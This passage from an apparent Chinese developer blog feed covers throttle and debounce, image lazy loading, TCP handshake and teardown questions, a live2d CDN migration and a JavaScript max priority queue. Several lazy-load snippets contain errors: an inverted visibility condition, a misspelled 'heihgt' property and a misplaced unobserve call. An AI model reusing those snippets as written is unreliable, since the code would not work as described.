class="hljs-literal">null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">...args</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span><br>        <span class="hljs-keyword">let</span> now = +<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()<br>        <span class="hljs-keyword">if</span> (now - last &gt; interval) &#123; <span class="hljs-comment">//超过了interval 需要响应了！</span><br>            last = now<br>            fn.<span class="hljs-title function_">apply</span>(context, args)                <br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (timer)<br>                <span class="hljs-built_in">clearTimeout</span>(timer)<br>            timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>                fn.<span class="hljs-title function_">apply</span>(context, args)<br>            &#125;, interval)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在事件非常频繁的时候，它的效果和正常的节流代码实际上是一样的效果，因为特别频繁的时候，计时器会被一直归零，然后每次响应都是超时那部分代码调用的，所以和节流效果一致了。所以个人感觉这种结合的方式没有什么特别亮眼的地方。</p><p>我还是写了一个页面，页面的主要内容是4个按钮，分别是正常点击、节流点击、防抖点击、节流防抖结合点击，你可以尝试点击它们查看不同的效果 😃</p><p>在线预览：<a href="https://wuuconix.github.io/static/throttle-debounce/">https://wuuconix.github.io/static/throttle-debounce/</a></p><p>源码链接：<a href="https://github.com/wuuconix/static/tree/main/throttle-debounce/src">https://github.com/wuuconix/static/tree/main/throttle-debounce/src</a></p><h2 id="11-能不能实现图片懒加载"><a class="markdownIt-Anchor" href="#11-能不能实现图片懒加载"></a> 11. 能不能实现图片懒加载？</h2><p>如果我们要手动实现的话，实际上思路非常简单，首先，我们将所有的图片都设置为一个默认的图片源，看后检测滚动信息，当图片出现在在用户的视图中的时候，我们就把图片的src设置为真正的图片源。</p><p>为了确定图片是否在用户的视图中，我们需要了解以下一些变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//浏览器视图已经滚动了多少像素了，如果还没滚动，这个值就是0</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span><br><br><span class="hljs-comment">//浏览器的视图高度</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span><br><br><span class="hljs-comment">//图片的顶部的绝对y值，如果一个图片顶着网页上端【和视图的上端不同】，它的值为0</span><br>imgEle.<span class="hljs-property">offsetTop</span><br></code></pre></td></tr></table></figure><p>然后我们如何判定一张图片在浏览器的视图中呢？我们考虑进入视图和离开视图这两种边界情况。</p><p>我们在滚动页面的过程中，图片会不断往上运动，一开始图片的上界等于视图下界的时候，图片就相当于进入了，然后图片的下界等于视图上界的时候，就是要离开了。</p><p>所以判断的条件应该类似这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> top = <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> <span class="hljs-comment">//视图上界</span><br><span class="hljs-keyword">let</span> bottom = <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span> <span class="hljs-comment">//视图下界</span><br><br><span class="hljs-keyword">let</span> imgTop = imgEle.<span class="hljs-property">offsetTop</span> <span class="hljs-comment">//图片上界</span><br><span class="hljs-keyword">let</span> imgBottom = imgEle.<span class="hljs-property">offsetTop</span> + imgEle.<span class="hljs-property">height</span> <span class="hljs-comment">//图片下界</span><br><br><span class="hljs-keyword">if</span> (imgTop &gt;= bottom &amp;&amp; imgBottom &lt;= top) &#123;<br>    imgEle.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;https://target.png&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>还有一种更加方便的做法是调用<code>imgEle.getBoundingClientRect().top</code></p><p>它将返回图片的上界相对于浏览器视图的相对坐标，比如它顶着视图上界，那么就是0。</p><p>同样根据之前的思想，我们可以将判断条件更改为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> imgRelativeTop = imgEle.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">top</span><br><span class="hljs-keyword">if</span> (imgRelativeTop &lt;= <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span> &amp;&amp; imgRelativeTop &gt;= -imgEle.<span class="hljs-property">heihgt</span>) &#123;<br>    imgEle.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;https://target.png&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>更加简单了对吧？值得注意的是，前这两种方法我们都是手动判断每个图片是否在视窗中，还需要绑定scroll事件，每次scroll的时候都需要判断，然后还需要加入节流或者防抖来提高性能。</p><p>接下来介绍的方法，利用了<code>IntersectionObserver</code>观察器，它帮我把监听scroll，判断是否在视窗中，以及节流全部做了。</p><p>具体的使用方法类似下面。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> imgs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&quot;img&quot;</span>)<br><br><span class="hljs-keyword">let</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(<span class="hljs-function">(<span class="hljs-params">changes</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; changes.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">let</span> change = changes[i]<br>        <span class="hljs-keyword">if</span> (change.<span class="hljs-property">isIntersecting</span>) &#123;<br>            <span class="hljs-keyword">let</span> imgEle = change.<span class="hljs-property">target</span><br>            imgEle.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;https://target.png&quot;</span><br>            imgEle.<span class="hljs-title function_">unobserve</span>(imgEle)<br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(imgs).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> observer.<span class="hljs-title function_">observe</span>(item))<br></code></pre></td></tr></table></figure><p>看起来很方便对吧？但是我在实际使用的时候遇到一点感觉不好的地方，因为它帮我们做了节流，而在有一些图片非常多的情况下，用户快速的从一开始滑动到结尾，如果是节流，在滑动的过程中会让一些图片响应，从而改变图片，而我认为这种情况下实际上不需要加载出来的，因为用户这么快速的滑动，很显然是只想看末尾的图片，所以我认为这种情况下用防抖更好，而IntersectionObserver貌似只能是节流，而不能是防抖。</p><blockquote><p>而且它的节流效果约等于0，一路滑下来，所有的图片都变了:(</p></blockquote><p>个人建议还是自己写吧，自由度高一些。</p><p>同样的，我写了一个懒加载页面，里面有100张图片，采用防抖方式，用户停止滚动0.2秒后，视图内的图片的源会被替换成它真正的源。</p><p>在线预览：<a href="https://wuuconix.github.io/static/lazyload/">https://wuuconix.github.io/static/lazyload/</a></p><p>源码链接：<a href="https://github.com/wuuconix/static/tree/main/lazyload/src">https://github.com/wuuconix/static/tree/main/lazyload/src</a></p><h1 id="tcp"><a class="markdownIt-Anchor" href="#tcp"></a> TCP</h1><h2 id="1-能不能说一说-tcp-和-udp-的区别"><a class="markdownIt-Anchor" href="#1-能不能说一说-tcp-和-udp-的区别"></a> 1. 能不能说一说 TCP 和 UDP 的区别？</h2><p>TCP: Transmission Control Protocol</p><p>UDP: User Datagram Protocol</p><p>概括来说，</p><ul><li><p>TCP是 面向连接的，可靠的，基于字节流的传输层协议。</p></li><li><p>UDP是 面向无连接的，不可靠的，基于数据包的传输层协议。</p></li></ul><p>具体来说，和UDP相比，TCP有三大核心特征。</p><ol><li><p>面向连接的。所谓连接，就是客户端和服务端的连接，在双方通信之前，TCP需要三次握手建立连接，而UDP则没有建立连接的过程。</p></li><li><p>可靠性。TCP的可靠性体现在 有状态 和 可控制。</p><ul><li><p>TCP会精确记录哪些数据发送了，哪些数据被接受了，哪些没有被接受，而且保证数据按需到达，不允许半点差错，这就是有状态。</p></li><li><p>当意识到丢包了或者网络环境不佳，TCP就会自动调整自己的发送速度或者重发。这是可控制。</p></li></ul></li><li><p>面向字节流。</p><p>UDP的数据传输是基于数据报的，这实际上仅仅是因为它继承了IP层的特性，因为IP数据报是数据报<code>IP Datagram</code>。而TCP为了维护状态，将一个个IP报变成了字节流。</p></li></ol><h2 id="2-说说-tcp-三次握手的过程"><a class="markdownIt-Anchor" href="#2-说说-tcp-三次握手的过程"></a> 2. 说说 TCP 三次握手的过程？</h2><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h1yvrjwlqpj30lq0cnaba.jpg" alt="三次握手" /></p><ul><li><p>首先服务器已经处于<strong>Listen</strong>状态，客户端还处于<strong>Closed</strong>状态。</p></li><li><p>客户端主动发起连接，发送SYN，自己变成了<strong>SYN-SENT</strong>状态。</p></li><li><p>服务端收到，发挥SYN和ACK（这个ACK对应客户端发来的SYN），自己变成<strong>SYN-RCVD</strong>。</p></li><li><p>之后客户端再发送ACK给服务端，自己变成了<strong>Established</strong>状态，服务端收到ACK后也变成了Estabilished状态。</p></li></ul><p>TCP的三次握手实际上是为了需要确认双方的两样能力：<strong>发送的能力</strong>和<strong>接受的能力</strong>。</p><p>而客户端一开始的SYN证明了自己发送的能力，服务器的的响应，证明了自己发送和接受的能力，最后客户端回应，证明了客户端接受的能力，这个时候，两个已经证明了自己发送和接受的能力，两者便可以开始数据传输了。</p><h2 id="3-为什么是三次而不是两次-四次"><a class="markdownIt-Anchor" href="#3-为什么是三次而不是两次-四次"></a> 3. 为什么是三次而不是两次、四次？</h2><p><strong>为什么不是两次</strong></p><p>根本原因是因为无法确认客户端的接受能力。</p><p>下面是一个例子。</p><p>客户端发送一个SYN包给服务端，但是包滞留在了当前网络中迟迟没有到达，TCP的重传机制会导致重传，重传后服务端响应，连接就建立了，目前都没有什么问题。</p><p>现在连接关闭了，那个滞留的包又到达了服务端，服务端以为客户端又要建立连接了，于是响应，建立了连接，但是实际上客户端已经断开了，客户端不会发送任何数据，而服务端就是等在那里，浪费了连接资源，这里就是因为两次握手导致的无法确认客户端是否具有接受能力，从而导致的连接资源浪费。</p><p><strong>为什么不是四次</strong></p><p>可以是四次，但是没有必要。因为握手的目的是为了检测客户端和浏览器的 发送和信息的能力，而三次握手后双方已经向对方证明了自己的能力，所以三次就够了，四次握手只会浪费资源。</p><h2 id="4-三次握手过程中可以携带数据么"><a class="markdownIt-Anchor" href="#4-三次握手过程中可以携带数据么"></a> 4. 三次握手过程中可以携带数据么？</h2><p>第三次握手的时候可以携带数据，前两次握手不可以携带数据。</p><p>因为第三次握手的时候，客户端已经处于了Estabilished状态，并且已经能够确认服务器的接受和发送能力了，相对安全，所以可以携带数据。</p><p>前两次不行，因为可能会导致攻击，比如黑客在第一个握手的SYN报文中放大量数据，这个时候服务器势必会消耗更多的时间和内存空间去处理这些数据，增大了服务器被攻击的风险。</p><h2 id="6-说说-tcp-四次挥手的过程"><a class="markdownIt-Anchor" href="#6-说说-tcp-四次挥手的过程"></a> 6. 说说 TCP 四次挥手的过程</h2><ul><li><p>首先服务器和客户端都处于Estabilished状态。</p></li><li><p>客户端向服务器发送Fin包，进入<strong>Fin_Wait-1</strong>状态。</p></li><li><p>服务器接受到Fin包，发送Ack，进入就<strong>Closed_wait</strong>状态。</p></li><li><p>客户端接受到Ack后，进入<strong>Fin_Wait_2</strong>状态。</p></li><li><p>服务器发送Fin包和Ack包，进入<strong>Last_Ack</strong>状态。</p></li><li><p>客户端接受到后，发送Ack包，进入<strong>Time_wait</strong>状态。</p></li><li><p>服务器接受到最后的Ack包后，进入<strong>Closed</strong>状态。</p></li><li><p>客户端在Time-Wait状态需要等待足够长的时间，具体来说是2个MSL <strong>Maximum Segment Lifetime</strong> 最大报文生存时间。如果这段时间内客户端都没有接受到服务器的的重发请求，那么表示ACK成功，挥手结束，否则客户端需要重发ACK。</p></li></ul><p><strong>等待2MSL的意义</strong></p><ul><li><p>1个MSL确保四次挥手中主动关闭方最后的ACK报文能够到达对端。</p></li><li><p>1个MSL确保对端没有收到ACK重传的Fin报文可以到达。</p></li></ul><p>实际就是等客户端是否会因为没有接受到ACK而重发，而服务器如果真的重发，到客户端这里的时侯的时间小于2MSL，而等待2MSL则后仍然没有收到服务器的重传，则证明ACK真的到达了服务端。</p><h2 id="7-为什么是四次挥手而不是三次"><a class="markdownIt-Anchor" href="#7-为什么是四次挥手而不是三次"></a> 7. 为什么是四次挥手而不是三次？</h2><p>和三次握手相比为什么多出来一次手呢？因为服务器在收到客户端的Fin包后先给一个ACK表示收到，延时一段时间后才会发送Fin包，这就造成了4次挥手。</p><p>如果我们换成3次挥手，也就是服务端的Ack和Fin包合并了，由于服务端发送Fin包之前必须要等待服务端的所有报文全部发送完毕，所以可能会等很久才能一起发送Ack和Fin包。这时长时间的延时可能会让客户端误以为Fin包没有到达服务端，从而客户端会不断的传递Fin包，产生资源的浪费。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>html5</tag>
      
      <tag>css</tag>
      
      <tag>javascipt</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我更新了博客看板娘</title>
    <link href="/2022/04/05/live2d/"/>
    <url>/2022/04/05/live2d/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-MjPGjgEp" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="453189277" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>最近博客的图片用上了又拍云CDN，网站加载速度快了不少。网站整体在<code>1~2s</code>之间就能完成加载，除了我的<strong>shizuku</strong>看板娘。</p><p>平常加载她需要<code>6~7s</code>的时间，而且每次切换页面，比如进入文章之类的操作，这个加载过程还会再进行一次，让人等的难受。</p><p>下图红色框起来的区域就是她的加载过程，我们看到，她从<code>2s</code>开始加载，一直加载到了<code>6s</code>。</p><p><img src="https://upyun.wuuconix.link/image-20220405160243477.png" alt="shizuku加载" /></p><p>经过测试，我发现是我用的hexo插件 <a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a> 出了问题。它把看板娘的静态资源都放在<code>unpkg.com</code>上供用户访问。然而这个cdn在国内的延迟很大。</p><p>以下是<code>unpkg</code>和<code>jsdeliver</code>的对比。</p><p><img src="https://upyun.wuuconix.link/image-20220405160847585.png" alt="unpkg" /></p><p><img src="https://upyun.wuuconix.link/image-20220405160918578.png" alt="jsdelivr" /></p><p>可以看到同样是国外cdn的<code>jsdelivr</code> 在国内许多城市的延迟在100ms以内，而<code>unpkg</code>则几乎全部接近200ms。</p><p>然后更离谱的情况发生了，我发现 <a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a>  这个项目在github已经归档了，已经变成只读的了。</p><p><img src="https://upyun.wuuconix.link/image-20220405161350416.png" alt="archived" /></p><p>用着一个已经被遗弃的项目，加载速度能快就有鬼了2333</p><h2 id="live2d-cdn的创建"><a class="markdownIt-Anchor" href="#live2d-cdn的创建"></a> live2d-cdn的创建</h2><p>在github简单搜了一下，目前比较流行的live2d项目是 <a href="https://github.com/stevenjoezhang/live2d-widget">stevenjoezhang/live2d-widget</a>。</p><p>里面包含两种得到资源的方式。</p><ol><li>利用 <a href="https://github.com/fghrsh/live2d_api">fghrsh/live2d_api</a> 在自己服务器上跑一个php程序当后端接口。称为api方式。</li><li>指定url链接，直接获取看板娘的需要静态资源。一般我们都会把资源放在cdn上获取最大速度，称为cdn方式。</li></ol><p>大学以来CTF的经历让我对php的印象不是很好，而且个人认为没有必要用后端接口，看板娘需要的就是它的静态资源文件，cdn方式完全可以得到目的。</p><p>于是我便简单魔改了一下代码，删除了原项目中 使用api的代码。</p><p>然后原项目因为怕涉及到版权问题，没有给live2d的模型。在找了一圈后，我发现 <a href="https://github.com/imuncle/live2d">imuncle/live2d</a> 这个仓库里面提供了许多模型。</p><p><img src="https://upyun.wuuconix.link/image-20220405162928490.png" alt="模型们" /></p><p>看了100多个模型，最后选择了小埋，我便把模型直接放到仓库里了。经过一番代码的调整，最后这个项目就完成了。</p><p><a href="https://github.com/wuuconix/live2d-cdn">wuuconix/live2d-cdn: 自用。仅包含cdnPath的live2d-widget。内置模型。 (github.com)</a></p><h2 id="效果展示"><a class="markdownIt-Anchor" href="#效果展示"></a> 效果展示</h2><p><img src="https://upyun.wuuconix.link/image-20220405163355863.png" alt="小埋" /></p><p>可以看到，现在整个网页包括小埋的加载都只用了<code>2.2s</code>。十分迅速。</p><p>而且由于 <a href="https://github.com/stevenjoezhang/live2d-widget">stevenjoezhang/live2d-widget</a> 的创新，给看板娘加上了<code>waifu-tool</code>。</p><p><img src="https://upyun.wuuconix.link/image-20220405163639958.png" alt="小埋" /></p><p>当鼠标指针移动到她身上的时候会出现一些功能按键。大家自己体验吧2333。实际效果很赞。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>live2d</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在JavaScript中使用最大优先队列</title>
    <link href="/2022/03/20/priorityQueue/"/>
    <url>/2022/03/20/priorityQueue/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-PrtKDrvz" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="5052607" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>作为一个算法白痴，昨天晚上十点半第一次参加了Leetcode的双周赛，其中有一道<a href="https://leetcode-cn.com/problems/minimum-operations-to-halve-array-sum/">题目</a>是这样的。</p><hr /><p>给你一个正整数数组 nums 。每一次操作中，你可以从 nums 中选择 任意 一个数并将它减小到 恰好 一半。（注意，在后续操作中你可以对减半过的数继续执行操作）</p><p>请你返回将 nums 数组和 至少 减少一半的 最少 操作数。</p><p>示例 1：</p><p>输入：nums = [5,19,8,1]<br />输出：3<br />解释：初始 nums 的和为 5 + 19 + 8 + 1 = 33 。<br />以下是将数组和减少至少一半的一种方法：<br />选择数字 19 并减小为 9.5 。<br />选择数字 9.5 并减小为 4.75 。<br />选择数字 8 并减小为 4 。<br />最终数组为 [5, 4.75, 4, 1] ，和为 5 + 4.75 + 4 + 1 = 14.75 。<br />nums 的和减小了 33 - 14.75 = 18.25 ，减小的部分超过了初始数组和的一半，18.25 &gt;= 33/2 = 16.5 。<br />我们需要 3 个操作实现题目要求，所以返回 3 。<br />可以证明，无法通过少于 3 个操作使数组和减少至少一半。</p><hr /><p>题目的思想很简单，就是贪心。因为要获得最少的操作次数，我们每次都去把最大的节点砍一半，肯定会就能最快到达target，也就能得到最少的操作次数。</p><p>而如果我们需要每次排序，然后砍一半，这个时间复杂度会很大，然后导致超时。我昨天就是在这里疯狂超时，最后也没做出来这道题目。</p><h2 id="最大优先队列"><a class="markdownIt-Anchor" href="#最大优先队列"></a> 最大优先队列</h2><p>凌晨12点比赛结束后，我和Lattice交流了这道题，发现Java里有<strong>PriorityQueue</strong>这种内置类，它基于堆，可以实现我们一往里加数，它内部就会自动排序，而且我们可以直接取出最大的数，这道题简直就是在考你知不知道这种数据结构。</p><p>这让我大开眼界，虽然说大二上已经学习了数据结构了，但是堆我是一点没记住。没事，会用就行，可是在我的记忆里JavaScript貌似根本就没有现成的优先队列对象。。</p><p>于是我在评论区里捕风捉影，发现Leetcode内置了 <strong><a href="https://github.com/datastructures-js/priority-queue">@datastructures-js/priority-queue</a></strong> 库。</p><p>我们可以使用以下代码新建一个最大有限队列。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MaxPriorityQueue</span>()<br></code></pre></td></tr></table></figure><p>插入数据和得到最大值，我们分别用enqueue和dequeue方法即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">queue.<span class="hljs-title function_">enqueue</span>(<span class="hljs-number">1</span>)<br>queue.<span class="hljs-title function_">enqueue</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">let</span> max = queue.<span class="hljs-title function_">dequeue</span>()<br></code></pre></td></tr></table></figure><p>如果我们需要在本地也使用这个库，直接npm全局安装即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g @datastructures-js/priority-queue<br></code></pre></td></tr></table></figure><p>然后在题目文件夹里里初始化，生成一个packages.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm init -y<br></code></pre></td></tr></table></figure><p>在packages.json里添加一个字段。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;module&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220320212359433.png" alt="type" /></p><p>这样，我们就能在js文件里用import引入库了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">MaxPriorityQueue</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/root/.nvm/versions/node/v16.13.2/lib/node_modules/@datastructures-js/priority-queue/index.js&#x27;</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">number[]</span>&#125; <span class="hljs-variable">nums</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-type">number</span>&#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">var</span> halveArray = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) &#123;<br>    <span class="hljs-keyword">let</span> sum = nums.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b) <span class="hljs-comment">//求和骚操作</span><br>    <span class="hljs-keyword">let</span> target = sum / <span class="hljs-number">2</span><br>    <span class="hljs-keyword">let</span> queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MaxPriorityQueue</span>()<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> num <span class="hljs-keyword">of</span> nums) &#123;<br>        queue.<span class="hljs-title function_">enqueue</span>(num)<br>    &#125;<br>    <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>, temp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (temp &lt; target ) &#123;<br>        <span class="hljs-keyword">let</span> &#123; element &#125; = queue.<span class="hljs-title function_">dequeue</span>() <span class="hljs-comment">//这里很奇怪，dequeue的结果难道是一个对象？</span><br>        element /= <span class="hljs-number">2</span><br>        temp += element<br>        queue.<span class="hljs-title function_">enqueue</span>(element)<br>        ans += <span class="hljs-number">1</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>值得注意的是，为什么我们dequeue那一句为什么返回结果好像是一个对象。</p><p>这是因为Leetcode使用的库版本是 v5.3.0，dequeue函数和最新版v6.0.0有些区别。</p><blockquote><p>考古指南</p><p>新版： <a href="https://github.com/datastructures-js/priority-queue#dequeue">https://github.com/datastructures-js/priority-queue#dequeue</a><br />旧版: <a href="https://github.com/datastructures-js/priority-queue/tree/v5.3.0#minpriorityqueuemaxpriorityqueue-3">https://github.com/datastructures-js/priority-queue/tree/v5.3.0#minpriorityqueuemaxpriorityqueue-3</a></p></blockquote><p><img src="https://upyun.wuuconix.link/image-20220320213036027.png" alt="新版" /></p><p><img src="https://upyun.wuuconix.link/image-20220320213130719.png" alt="旧版" /></p><p>旧版返回的是一个对象，里面有priority优先级属性和element属性。</p><p>所以新版我们这样写就行了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">MaxPriorityQueue</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/root/.nvm/versions/node/v16.13.2/lib/node_modules/@datastructures-js/priority-queue/index.js&#x27;</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">number[]</span>&#125; <span class="hljs-variable">nums</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-type">number</span>&#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">var</span> halveArray = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) &#123;<br>    <span class="hljs-keyword">let</span> sum = nums.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b) <span class="hljs-comment">//求和骚操作</span><br>    <span class="hljs-keyword">let</span> target = sum / <span class="hljs-number">2</span><br>    <span class="hljs-keyword">let</span> queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MaxPriorityQueue</span>()<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> num <span class="hljs-keyword">of</span> nums) &#123;<br>        queue.<span class="hljs-title function_">enqueue</span>(num)<br>    &#125;<br>    <span class="hljs-keyword">let</span> ans = <span class="hljs-number">0</span>, temp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (temp &lt; target ) &#123;<br>        <span class="hljs-keyword">let</span> element = queue.<span class="hljs-title function_">dequeue</span>() <span class="hljs-comment">//新版直接等于即可</span><br>        element /= <span class="hljs-number">2</span><br>        temp += element<br>        queue.<span class="hljs-title function_">enqueue</span>(element)<br>        ans += <span class="hljs-number">1</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220320213513766.png" alt="本地" /></p><p>本地能够正常运行。</p><p><img src="https://upyun.wuuconix.link/image-20220320213546462.png" alt="leetcode" /></p><p>LeetCode因为使用旧版本，则会报错。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>JavaScirpt</tag>
      
      <tag>算法</tag>
      
      <tag>LeetCode</tag>
      
      <tag>最大优先队列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手机图片瘦身小脚本 Mobile Photo Slim Project</title>
    <link href="/2022/03/08/slim/"/>
    <url>/2022/03/08/slim/</url>
    
